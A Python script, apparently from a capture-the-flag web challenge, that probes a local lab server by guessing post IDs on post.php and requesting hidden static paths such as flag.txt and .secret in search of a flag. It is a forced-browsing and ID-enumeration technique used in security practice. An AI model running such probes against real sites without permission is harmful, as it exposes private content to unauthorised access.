import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Testing IDs based on content clues...")

# From ScriptKiddie-v2 we saw "ByteBandit404" mentioned
test_ids = [
    "ByteBandit404",
    "ByteBandit",
    "ByteBandit404-v2",
    "scriptkiddie-v3",
    "ScriptKiddie-v3",
    "hacker",
    "Hacker",
    "admin",
    "AdminPost",
]

for test_id in test_ids:
    resp = requests.get(f"{base_url}/post.php", params={'id': test_id})
    if "Post not found" not in resp.text and len(resp.text) > 100:
        print(f"\n[!] Found: {test_id}")
        print(f"Length: {len(resp.text)}")
        if 'FLAG{' in resp.text:
            print("[!!!] FLAG FOUND!")
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            print(f"Flags: {flags}")
            print("\nFull response:")
            print(resp.text)
            break
        else:
            # Show preview
            content_match = re.search(r'<h1[^>]*>(.*?)</h1>', resp.text, re.DOTALL)
            if content_match:
                print(f"Title: {content_match.group(1).strip()}")
    else:
        print(f"Not found: {test_id}")

# Let's also check the static images directory - maybe there's something there
print("\n\n[+] Checking static/images directory...")
image_files = [
    "script_kiddie.jpg",
    "script_kiddie-v2.jpg",
    "flag.jpg",
    "flag.txt",
    "secret.jpg",
]

for img in image_files:
    resp = requests.get(f"{base_url}/static/images/{img}")
    print(f"{img}: Status {resp.status_code}, Length {len(resp.content)}")
    if resp.status_code == 200 and resp.content[:4] != b'\xff\xd8\xff':  # Not JPEG
        # Might be text file disguised as image
        try:
            text = resp.content.decode('utf-8')
            if 'FLAG{' in text:
                print(f"[!!!] FLAG in {img}!")
                print(text)
        except:
            pass

# Try other static paths
print("\n[+] Checking other static paths...")
static_files = [
    "static/flag.txt",
    "static/secret.txt",
    "static/config.txt",
    "static/.flag",
    "static/.secret",
]

for path in static_files:
    resp = requests.get(f"{base_url}/{path}")
    if resp.status_code == 200:
        print(f"\n[!] Found: {path}")
        print(resp.text[:500])
        if 'FLAG{' in resp.text:
            print("[!!!] FLAG FOUND!")

